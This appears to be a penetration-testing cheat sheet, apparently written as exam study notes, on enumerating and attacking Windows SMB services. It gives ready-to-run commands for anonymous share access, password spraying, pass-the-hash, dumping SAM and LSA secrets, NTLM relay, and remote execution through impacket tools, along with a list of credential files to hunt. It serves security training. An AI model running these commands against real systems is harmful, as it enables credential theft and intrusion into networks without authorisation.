
---

# 🛰️ SMB (Server Message Block)

> [!info] What is SMB?
> 
> SMB is a file-sharing and remote administration protocol used by Windows, Linux (Samba), and Unix systems.

**Ports**

```text
139/tcp  → NetBIOS SMB (Legacy)
445/tcp  → SMB over TCP (Modern)
```

**Common Uses**

- File Shares
    
- Printer Shares
    
- Remote Administration
    
- MSRPC Communication
    
- Active Directory Operations
    

---

# 🎯 Quick Enumeration Workflow

```text
445 Open?
   ↓
Enumerate Shares
   ↓
Check Null/Guest Access
   ↓
Enumerate Users/Groups
   ↓
Look for Sensitive Files
   ↓
Password Spray
   ↓
Admin Access?
   ↓
PsExec / SMBExec / PtH
```

---

# 📂 Important SMB Shares

|Share|Purpose|
|---|---|
|`C$`|Entire C Drive|
|`ADMIN$`|Windows Directory|
|`IPC$`|RPC Communication|
|`NETLOGON`|Domain Logon Scripts|
|`SYSVOL`|Domain Policies|
|Custom Shares|User-created folders|

---

# 🔍 Initial Enumeration

## Nmap

```bash
sudo nmap -sC -sV -p139,445 <IP>
```

Aggressive SMB Enumeration:

```bash
sudo nmap --script smb* -p445 <IP>
```

---

## SMB Shares

### smbclient

Anonymous:

```bash
smbclient -N -L //<IP>
```

Authenticated:

```bash
smbclient -L //<IP> -U user
```

Access Share:

```bash
smbclient //<IP>/share -U user
```

---

### smbmap

List Shares:

```bash
smbmap -H <IP>
```

Authenticated:

```bash
smbmap -H <IP> -u user -p pass
```

Recursive Listing:

```bash
smbmap -H <IP> -r share
```

Download File:

```bash
smbmap -H <IP> --download "share/file.txt"
```

Upload File:

```bash
smbmap -H <IP> --upload local.txt share/file.txt
```

---

# 👤 Null Session Enumeration

Anonymous RPC:

```bash
rpcclient -U'%' <IP>
```

Useful Commands:

```bash
enumdomusers
enumdomgroups
queryuser RID
querygroup RID
getdompwinfo
srvinfo
```

---

# 🌐 enum4linux-ng

Full Enumeration:

```bash
enum4linux-ng.py <IP> -A
```

Common Targets:

```text
Users
Groups
Shares
Password Policy
OS Version
Domain Info
```

---

# 🔓 Guest / Anonymous Access

Check Access:

```bash
smbclient -N -L //<IP>
```

Recursive Enumeration:

```bash
smbmap -H <IP> -r share
```

Download Everything:

```bash
smbget -R smb://<IP>/share
```

---

# 🔑 Password Spraying

### CrackMapExec

Local Accounts

```bash
crackmapexec smb <IP> \
-u users.txt \
-p 'Password123!' \
--local-auth
```

Domain Accounts

```bash
crackmapexec smb <IP> \
-u users.txt \
-p 'Password123!'
```

---

# 🔥 Command Execution

## CrackMapExec

```bash
crackmapexec smb <IP> \
-u user \
-p pass \
-x whoami
```

---

## PsExec

Password

```bash
impacket-psexec user:'Password123!'@<IP>
```

Hash

```bash
impacket-psexec \
-hashes :NTHASH \
user@<IP>
```

---

## SMBExec

```bash
impacket-smbexec user:'Password123!'@<IP>
```

---

## WMIExec

```bash
impacket-wmiexec user:'Password123!'@<IP>
```

---

# 🎭 Pass-the-Hash (PtH)

Authenticate Using NTLM Hash

```bash
crackmapexec smb <IP> \
-u Administrator \
-H NTHASH
```

PsExec:

```bash
impacket-psexec \
-hashes :NTHASH \
Administrator@<IP>
```

WMIExec:

```bash
impacket-wmiexec \
-hashes :NTHASH \
Administrator@<IP>
```

Requirements:

```text
Username
NTLM Hash
Admin Rights
```

No plaintext password needed.

---

# 🧪 Common CrackMapExec Commands

### Check Access

```bash
crackmapexec smb <IP> \
-u user \
-p pass
```

### Enumerate Shares

```bash
crackmapexec smb <IP> \
-u user \
-p pass \
--shares
```

### Enumerate Sessions

```bash
crackmapexec smb <IP> \
-u user \
-p pass \
--sessions
```

### Enumerate Logged-On Users

```bash
crackmapexec smb <IP> \
-u user \
-p pass \
--loggedon-users
```

### Dump SAM

```bash
crackmapexec smb <IP> \
-u user \
-p pass \
--sam
```

### Dump LSA Secrets

```bash
crackmapexec smb <IP> \
-u user \
-p pass \
--lsa
```

---

# 🧨 NTLM Relay

Capture Hashes:

```bash
sudo responder -I tun0
```

Relay Hashes:

```bash
impacket-ntlmrelayx \
-smb2support \
-t smb://<TARGET>
```

Requirements:

```text
SMB Signing Disabled
Victim Authentication
Reachable Target
```

---

# 📌 High-Value Files to Hunt

```text
passwords.txt
creds.txt
backup.zip
KeePass (.kdbx)
web.config
groups.xml
id_rsa
config.php
database.yml
.vpn
```

Also search for:

```text
password
passwd
secret
token
key
credential
backup
```

---

# ⚠️ Common Findings

|Finding|Impact|
|---|---|
|Null Session|User Enumeration|
|Guest Access|Data Exposure|
|Writable Share|Malware Drop / Lateral Movement|
|Local Admin Credentials|SYSTEM Shell|
|NTLM Hashes|Pass-the-Hash|
|SMB Signing Disabled|NTLM Relay|

---

# 🧠 Exam Mental Model

```text
SMB Open
 ├─ Shares?
 │   ├─ Read?
 │   │   └─ Download Everything
 │   │
 │   └─ Write?
 │       └─ Upload Payloads
 │
 ├─ Null Session?
 │   └─ Enumerate Users
 │
 ├─ Credentials?
 │   └─ CME Enumeration
 │
 ├─ Admin?
 │   ├─ PsExec
 │   ├─ SMBExec
 │   └─ WMIExec
 │
 └─ Hashes?
     └─ Pass-the-Hash
```

> [!success] SMB Rule of Thumb
> 
> **Whenever you see port 445 open, immediately think:**
> 
> ```text
> Shares
> Users
> Password Policy
> Credentials
> Admin Access
> Lateral Movement
> ```
> 
> Most AD compromises eventually involve SMB in some form. It is often the primary protocol for enumeration, credential validation, lateral movement, and remote command execution.